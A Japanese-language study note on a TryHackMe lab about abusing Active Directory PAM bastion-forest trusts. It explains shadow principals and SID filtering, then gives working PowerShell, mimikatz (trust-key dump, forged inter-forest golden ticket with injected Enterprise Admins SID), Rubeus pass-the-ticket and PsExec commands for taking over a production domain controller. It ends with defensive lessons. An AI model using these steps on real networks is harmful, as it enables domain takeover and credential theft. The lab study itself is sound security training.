# PAMトラスト

https://tryhackme.com/room/pamtrustexploitation

「バスティオン」または「レッドフォレスト」と呼ばれる、セキュリティを強化した別のフォレストを構築し、すべての特権管理者アカウントをそこに移動する。そして、本番環境のフォレストは、必要な場合にのみ特権アクセスを付与するよう、バスティオンフォレストを信頼する。

本番環境がバスティオン環境を信頼している → バスティオン環境のユーザーが本番環境へのアクセス権を取得できる

## PAMの仕組み

通常、チケットがフォレスト間の信頼関係を越える場合、SIDフィルタリングと呼ばれる保護機能によって、信頼されたフォレストに属さないSIDが削除される。

PAMトラストでは、SIDフィルタリングが無効になる。

誰かが本番環境へのアクセス権を必要とする場合、そのユーザーのバスティオンアカウントが特別なオブジェクトに追加され、それが本番グループにマッピングされる。そして、有効期限が切れると、そのアクセス権は自動的に削除される。特殊オブジェクトはシャドウセキュリティプリンシパルである。バスティオンフォレストにあるが、プロダクショングループのSIDを保持している。

SIDFilteringQuarantined がFalse の場合、本番環境自体に属するSIDを含め、バスティオンフォレストのSIDは削除されずに尊重される。つまり、PAMトラストによって、バスティオンフォレストはプロダクション独自の特権SIDを提示でき、プロダクションはそれを信頼する。

## シャドウセキュリティ

シャドウプリンシパルは、バスティオンフォレスト内に存在するオブジェクト。その役割は、バスティオンアカウントを本番環境の特権グループにマッピングすること。

各シャドウプリンシパルには、msDS-ShadowPrincipalSid 属性がある。この属性には、本番環境のドメイン管理者など、本番環境グループのSIDが格納される。

シャドウプリンシパル構成コンテナの例

```
CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion,DC=thm
```

シャドウプリンシパルのメンバーであるバスティオン環境のユーザーがKerberosチケットを要求すると、バスティオン環境のドメインコントローラーは、その本番環境用SIDをユーザーのPAC（特権属性証明書）に追加する。

## 列挙

### バスティオンから見たトラストの列挙

重要なのは、SIDFilteringQuarantined でSIDフィルターが無効になっていること。

```ps
Get-ADTrust -Filter * | Select Name, Direction, ForestTransitive, SIDFilteringQuarantined, TrustAttributes


Name                    : prod.thm
Direction               : Inbound
ForestTransitive        : True
SIDFilteringQuarantined : False
TrustAttributes         : 8
```

SIDFilteringQuarantined が False のものだけ表示

```ps
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
```

### シャドウプリンシパルの列挙

メンバーフィールドは現状空になっている

```ps
$sp = 'CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion,DC=thm'

Get-ADObject -SearchBase $sp -Filter * -Properties msDS-ShadowPrincipalSid, member | Select Name, msDS-ShadowPrincipalSid, member

Name                           msDS-ShadowPrincipalSid                     member
----                           -----------------------                     ------
Shadow Principal Configuration                                             {}
ProdDomainAdmins               S-1-5-21-1966530601-3185510712-10604624-512 {}
```

SIDを本番環境に問い合わせる。

```ps
$sid = 'S-1-5-21-1966530601-3185510712-10604624-512'

Get-ADGroup -Server prod.thm -Identity $sid | Select-Object Name

Name
----
Domain Admins
```

## シャドウプリンシパル悪用

シャドウプリンシパルに自分自身を追加

```ps
$sp = 'CN=ProdDomainAdmins,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion,DC=thm'

Set-ADObject $sp -Add @{ 'member' = 'CN=Administrator,CN=Users,DC=bastion,DC=thm' }
```

状況を確認

```ps
$prodDA = 'S-1-5-21-1966530601-3185510712-10604624-512'

[Security.Principal.WindowsIdentity]::GetCurrent().Groups.Value -contains $prodDA
False
```

Falseになっている。プロダクションSIDが新しいトークンを取得したときにのみトークンに反映されるため、（Windowsのユーザーアイコンから）一度サインアウトして再度ログインが必要。

これがTrueになったら、踏み台セッションが本番環境のドメイン管理者SIDを保持していることを意味する。

プロダクションサーバーを列挙

```ps
dir \\DC01-PROD.prod.thm\C$
```

対話的なセッション

```ps
Enter-PSSession -ComputerName DC01-PROD.prod.thm
```

## SIDインジェクション

### 条件

1. 信頼関係においてSIDフィルタリングが無効になっていること
2. 信頼キー（2つのフォレストが互いの信頼性を保証するために使用する共有秘密鍵）

### 収集

1. 偽造チケットがあなたが所属していると主張する、あなた自身のドメインのSID

```ps
(Get-ADDomain).DomainSID.Value
S-1-5-21-696215726-3453771242-1174301429
```

2. あなたが注入している特権SIDである、本番環境のEnterprise Adminsグループ

```ps
(Get-ADGroup 'Enterprise Admins' -Server prod.thm).SID.Value
S-1-5-21-1966530601-3185510712-10604624-519
```

3. 信頼キー。aes256_hmac の値を使う。

```ps
C:\Tools\mimikatz\x64\mimikatz.exe
privilege::debug
lsadump::trust /patch
```

### 悪用

チケットの偽造。収集した3つのピースを当てはめる。

```ps
mimikatz # kerberos::golden /user:Administrator /domain:bastion.thm /sid:<BASTION_DOMAIN_SID> /aes256:<AES256_TRUST_KEY> /service:krbtgt /target:prod.thm /sids:<PROD_EA_SID> /ticket:C:\Tools\trust.kirbi
```

セッションにキャッシュされているチケットをすべてクリア

```ps
klist purge
```

Rubeus でサービスチケットを要求し、その結果を直接メモリに書き込む。

```ps
C:\Tools\Rubeus.exe asktgs /ticket:C:\Tools\trust.kirbi /service:cifs/DC01-PROD.prod.thm /dc:DC01-PROD.prod.thm /ptt
```

確認

```ps
dir \\DC01-PROD.prod.thm\C$
```

対話型シェル

```ps
C:\Tools\PsExec.exe -accepteula \\DC01-PROD.prod.thm cmd
```

## まとめ

- 信頼関係は、SIDをフィルタリングしている間だけセキュリティ境界として機能する。そのフィルタリングを緩めると、信頼関係は攻撃者が簡単に渡れる橋となってしまう。
- PAMトラストは、バスティオンフォレストを単一障害点にしてしまう。バスティオンを所有するユーザーが本番環境も所有することになる。なぜなら、トラストはバスティオンアカウントに本番環境の権限を与えるために存在するものであり、通過するデータをフィルタリングしないから。
- 本当に守るべきはバスティオンフォレスト。チームはプロダクションの保護に時間を費やすが、攻撃側がバスティオンフォレストを占領すれば、プロダクションも手に入れてしまう。
- SIDインジェクションの手法は、PAMトラストに限ったものではない。同じアイデアは、同一フォレスト内のドメイン間でも有効。
